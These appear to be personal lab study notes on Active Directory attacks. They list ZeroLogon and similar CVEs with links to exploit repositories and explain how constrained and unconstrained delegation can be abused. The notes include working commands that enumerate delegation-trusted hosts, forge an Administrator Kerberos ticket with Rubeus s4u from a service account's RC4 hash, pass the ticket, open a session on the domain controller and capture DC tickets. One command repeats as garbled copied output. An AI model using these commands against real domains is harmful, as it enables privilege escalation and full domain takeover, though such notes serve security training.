
Most popular vulnerability in Active Directory
- ZeroLogon (Dangerous)
- PrintNightmare
- Sam the Admin
- Eternal Blue


Zerologons
https://www.trendmicro.com/en_us/what-is/zerologon.html
https://github.com/dirkjanm/CVE-2020-1472
https://github.com/SecuraBV/CVE-2020-1472

### Constrained Delegation:

“This service account is allowed to impersonate users
ONLY when talking to these specific services.”

If an attacker controls a service account trusted for constrained delegation, they can impersonate any user to specific services without knowing passwords.

Example:
Web service → HTTP service on Domain Controller
Web service → SQL service

These allowed services are stored in Active Directory attributes.

A service account (web_service)
Is trusted for constrained delegation
And gets compromised by an attacker

Now the attacker can:
Pretend to be the web_service account

Ask the KDC:
“Give me a ticket for user Administrator to Service HTTP/DC1”

KDC responds:

“Okay — you’re trusted.”

❌ No Administrator password required
❌ No login attempt detected
❌ Fully valid Kerberos ticket



> [!NOTE] Note
> The KDC does NOT require the user’s password when issuing a delegated ticket

### Unconstrained Delegation:
- Can impersonate any user
- Can access any service
- If compromised → domain compromise
![[Pasted image 20251010002449.png]]
![[Pasted image 20251010002500.png]]
```bash
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties trustedfordelegation,serviceprincipalname,description


Import-Module .\powerview.ps1
Get-NetComputer -Unconstrained

.\Rubeus.exe s4u /user:webservice /rc4:FCDC65703DD2B0BD789977F1F3EEAECF /domain:eagle.local /impersonateuser:Administrator /msdsspn:"http/dc1" /dc:dc1.eagle.local /ptt


C:\Users\bob\Downloads>I.\Rubeus. exe s4u /user:webservice /rc4: FCDC65703DD2BOBD789977F1F3EEAECF /domain: eagle. local
/impersonateuser : Administrator /msdsspn: "http/dc1" /dc: dcl. eagle. local /ptt

klist

Enter-PSSession dc1

.\Rubeus.exe monitor /monitorinterval:5 /targetuser:HYDRA-DC$ /nowrap 


Invoke-WebRequest http://HYDRA-DC.MARVEL.local -UseDefaultCredentials -UseBasicParsing
```

